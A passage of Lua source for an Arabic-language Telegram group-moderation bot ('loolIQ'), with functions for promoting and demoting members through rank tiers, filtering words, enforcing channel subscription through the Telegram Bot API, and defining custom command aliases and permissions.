ABS_PROX = "ٱڵعضو" 
end
return ABS_PROX
end
--     Source loolIQ     --
--       Set Sudo3        --
function setdev3(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم رفعه فيۧ قٱئمة ٱڵمطورين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end 
--     Source loolIQ     --
--       Del Sudo3        --
function deldev3(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـۧمـۧطـۧۄر ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم تنزيڵه من قٱئمة ٱڵمطورين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Set onall        --
function setonall(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم رفعه فيۧ قٱئمة ٱڵمدرٱء ٱڵعٱمين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Del Onall        -- 
function delonall(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵمدير ٱڵعٱم ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم تنزيڵه من قٱئمة ٱڵمدرٱء ٱڵعٱمين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Set Moall        -- 
function setmoall(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم رفعه فيۧ قٱئمة ٱلٱدمنية ٱڵعٱمين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Del Moall        -- 
function delmoall(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱلٱدمن ٱڵعٱم ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم تنزيڵه من قٱئمة ٱلٱدمنية ٱڵعٱمين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Set Vipall       -- 
function setvipall(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم رفعه فيۧ قٱئمة ٱڵمميزين ٱڵعٱم \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Del Vipall       -- 
function delvipall(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـمميـۧز ٱڵعٱم ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* )\n📣 ⌯ تـۖم تنزيڵه من قٱئمة ٱڵمميزين ٱڵعٱم \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Set Monsh        -- 
function setmonsh(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم رفعه منشئ ٱسٱسي \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Del Monsh        --
function delmonsh(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ *ٱڵمنشئ ٱلٱسٱسي ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم تنزيڵه منشئ ٱسٱسي \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Set Monsh2       -- 
function setmonsh2(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم رفعه فيۧ قٱئمة ٱڵمنشئين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Del Monsh2       -- 
function delmonsh2(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـمنشئ ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم تنزيڵه من قٱئمة ٱڵمنشئين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Set Owner        -- 
function setowner(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم رفعه فيۧ قٱئمة ٱڵمدرٱء \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Del Owner        -- 
function delowner(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـۧمـۧديـۧر ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم تنزيڵه من قٱئمة ٱڵمدرٱء \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Set Momod        -- 
function setmomod(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم رفعه فيۧ قٱئمة ٱلٱدمنية \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Del Momod        -- 
function delmomod(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱلٱدمـن ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم تنزيڵه من قٱئمة ٱلٱدمنية \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Set Vipmem       -- 
function setvipmem(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم رفعه فيۧ قٱئمة ٱڵمميزين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
--       Del Vipmem       -- 
function delvipmem(msg,chat,user)
local user_info_ = DevAbs:get(loolIQ..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..absc9..'] ◟\n🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ *'..user..'* ◟\n📣 ⌯ تـۖم تنزيڵه من قٱئمة ٱڵمميزين \n🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end
--     Source loolIQ     --
function absmasco(user_id,chat_id)
if is_leaderid(user_id) then
var = true  
elseif DevAbs:sismember(loolIQ..'abs:sudo3:', user_id) then
var = true  
elseif DevAbs:sismember(loolIQ..'abs:ownerall:', user_id) then
var = true  
elseif DevAbs:sismember(loolIQ..'abs:adminall:', user_id) then
var = true  
elseif DevAbs:sismember(loolIQ..'abs:vipall:', user_id) then
var = true  
elseif DevAbs:sismember(loolIQ..'abs:monsh:'..chat_id, user_id) then
var = true
elseif is_monsh(chat_id, user_id) then
var = true
elseif DevAbs:sismember(loolIQ..'abs:monshid:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(loolIQ..'abs:owners:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(loolIQ..'abs:admins'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(loolIQ..'abs:vipmem'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end
function masco(user_id,chat_id)
if is_leaderid(user_id) then
var = 'botow'  
elseif DevAbs:sismember(loolIQ..'abs:sudo3:', user_id) then
var = 'sudo3'  
elseif DevAbs:sismember(loolIQ..'abs:monsh:'..chat_id, user_id) then
var = 'monsh'
elseif DevAbs:sismember(loolIQ..'abs:monshid:'..chat_id, user_id) then
var = 'monsh2'
elseif DevAbs:sismember(loolIQ..'abs:owners:'..chat_id, user_id) then
var = 'owner'  
else  
var = 'No'
end  
return var
end 
--     Source loolIQ     --
local function check_filter_words(msg, value)
local abs = (loolIQ..'bot:filters:'..msg.chat_id_)
if abs then
local names = DevAbs:hkeys(abs)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_admin(msg.sender_user_id_, msg.chat_id_)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
end
end
--     Source loolIQ     --
local getChat = function(chat_id, cb)
tdcli_function({ID = "GetChat", chat_id_ = chat_id}, cb or dl_cb, nil)
end
--     Source loolIQ     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageVoice",
voice_ = getInputFile(voice),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = {
ID = "InputMessageSticker",
sticker_ = getInputFile(sticker),
width_ = 0,
height_ = 0
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end
function formsgg(msgs) 
local ABS_PROX = ''  
if msgs < 100 then 
ABS_PROX = "ضعيف جدا"
elseif msgs < 250 then 
ABS_PROX = "ضعيف"
elseif msgs < 500 then 
ABS_PROX = "غير متفاعل"
elseif msgs < 750 then 
ABS_PROX = "متوسط"
elseif msgs < 1000 then 
ABS_PROX = "متفاعل"
elseif msgs < 2000 then 
ABS_PROX = "قمه التفاعل"
elseif msgs < 3000 then 
ABS_PROX = "ملك التفاعل"
elseif msgs < 4000 then 
ABS_PROX = "اسطوره التفاعل"
elseif msgs < 5000 then 
ABS_PROX = "نار وشرار" 
elseif msgs < 6000 then 
ABS_PROX = "جهنم حبي" 
elseif msgs < 7000 then 
ABS_PROX = "فول" 
elseif msgs < 8000 then 
ABS_PROX = "معلك لربك" 
elseif msgs < 9000 then 
ABS_PROX = "حارك الكروب" 
end 
return ABS_PROX
end
function title_name(GroupID) 
tdcli_function({ID ="GetChat",chat_id_=GroupID
},function(arg,data) 
DevAbs:set(loolIQ..'bot:group:name'..GroupID,data.title_) 
end,nil) 
return DevAbs:get(loolIQ..'bot:group:name'..GroupID)  end
--     Source loolIQ     --
function absmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevAbs:get(loolIQ..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source loolIQ     --
function tdcli_update_callback(data)
end
--     Source loolIQ     --
function Abbas_Abs(msg)
local var = true 
if DevAbs:get(loolIQ.."DevAbs2") then
local channel = ''..DevAbs:get(loolIQ..'DevAbs3')..''
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevAbs:get(loolIQ..'bot:textch:user') then
local textchuser = DevAbs:get(loolIQ..'bot:textch:user')
Dev_Abs(msg.chat_id_, msg.id_, 1, '['..textchuser..']', 1, 'md')
else
Dev_Abs(msg.chat_id_,msg.id_, 1, "❗️🚸 ⌯ عذرٱ لٱيمكنك ٱستخدٱم ٱڵبوت \n❗️🔑 ⌯ رجائٱ ٱشترك في قنٱة ٱڵبوت \n❗️🎗 ⌯ ڵتتمكن من ٱستخدٱمه \n❗️📣 ⌯ ٱڵقنٱت ⌯» { ["..channel.."] } \n ", 1 , "md")
end
elseif data.ok then
return var
end
else
return var
end
end

function tdcli_update_callback(data)
local our_id = DevAbs:get(loolIQ.."Our_ID") or 0
local api_id = DevAbs:get(loolIQ.."Bot:Api_ID") or 0
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and DevAbs:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevAbs:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevAbs:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ تـۖم حـذف ٱلٱمـر مِن ٱڵمجـمۄعة", 1, 'html')  
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ لايوجد ٱمـر بِهـذٱ  ٱلٱســم", 1, 'html')
end
DevAbs:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if data.message_.content_.text_ then
local NewCmmd = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end

if text and DevAbs:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevAbs:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل ٱلٱمـر ٱڵـجديـد", 1, 'html')
DevAbs:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevAbs:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevAbs:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevAbs:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevAbs:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ تـم حُـفِـظ ٱلٱمـر", 1, 'html')
DevAbs:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text == "الاوامر المضافه" then
local list = DevAbs:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."")
t = "❗️🎒 ⌯ قٱئمة ٱلٱوامر ٱڵمضافة : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k,v in pairs(list) do
Cmds = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."⌯ ("..v..") • {"..Cmds.."}\n"
else
t = t..""..k.."⌯ ("..v..") \n"
end
end
if #list == 0 then
t = "❗️📛 ⌯ لايوجد ٱوٱمـر مُـضافة فيۧ ٱڵمجـمۄعة"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "["..t.."]", 1, 'md')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" then
local list = DevAbs:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
DevAbs:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevAbs:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ تـۖم حـذف ٱلٱوامـر ٱڵـمُـضافة فيۧ ٱڵـمجـمۄعة", 1, 'html')
end
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" then
DevAbs:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل ٱلٱمـر ٱڵـقديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" then 
DevAbs:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل ٱلٱمـر ٱڵـذي قُـمتَ بٱضافتـة يدويـاً", 1, 'html')
return false
end
--     Source loolIQ     --
if text == "الصلاحيات" or text == "صلاحيات" then 
local list = DevAbs:smembers(bot_id.."Coomds"..msg.chat_id_)
if #list == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ لايوجد صلاحيات مُـضافة فيۧ ٱڵمجـمۄعة", 1, 'html')
return false
end
t = "❗️🎒 ⌯ قٱئمة ٱڵصلٱحيٱت ٱڵمضافة : \n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k,v in pairs(list) do
var = DevAbs:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."⌯ "..v.." • ("..var..")\n"
else
t = t..""..k.."⌯ "..v.."\n"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الصلاحيات" or text == "مسح الصلاحيات" then
local list = DevAbs:smembers(bot_id.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
DevAbs:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
DevAbs:del(bot_id.."Coomds"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ تـۖم حذف ٱلصلاحيات ٱڵمُضافة فيۧ ٱڵمجمۄعة", 1, 'html')
end
if text and text:match("^اضف صلاحيه (.*)$") then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevAbs:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevAbs:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
DevAbs:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل نـوع ٱڵـصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n❗️🔑 ⌯ ٱرسـڵ ٱڵغٱء لٱڵغٱء ٱلٱمر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") or text and text:match("^حذف صلاحيه (.*)$") then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
DevAbs:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ تـم حـذف ٱلصلاحيه", 1, 'html')
end
if DevAbs:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ تـۖم ٱڵـغـاء ٱلٱمـر", 1, 'html')
DevAbs:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل نـوع ٱڵـصلاحيه \n👁‍🗨❕ يمكنك ٱضافـة صلاحية مِـثـل :\n { عضو • مميز  • ادمن }", 1, 'html')
return false
end
end
if text == "ادمن" then
if not is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل نـوع ٱڵـصلاحيه \n👁‍🗨❕ يمكنك ٱضافـة صلاحية مِـثـل :\n { عضو • مميز }", 1, 'html')
return false
end
end
if text == "مميز" then
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل نـوع ٱڵـصلاحيه \n👁‍🗨❕ يمكنك ٱضافـة صلاحية مِـثـل :\n { عضو }", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevAbs:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevAbs:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ تـم ٱضافة ٱلصلاحيه", 1, 'html')
DevAbs:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("رفع (.*)")
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم رفعه ◝ '..DEV_ABBAS..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
DevAbs:sadd(loolIQ..'abs:vipmem'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم رفعه ◝ '..DEV_ABBAS..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
DevAbs:sadd(loolIQ..'abs:admins'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "مدير" and is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم رفعه ◝ '..DEV_ABBAS..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
DevAbs:sadd(loolIQ..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "عضو" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم رفعه ◝ '..DEV_ABBAS..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 

local DEV_ABBAS = text:match("تنزيل (.*)")
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and is_admin(msg.sender_user_id_, msg.chat_id_) then
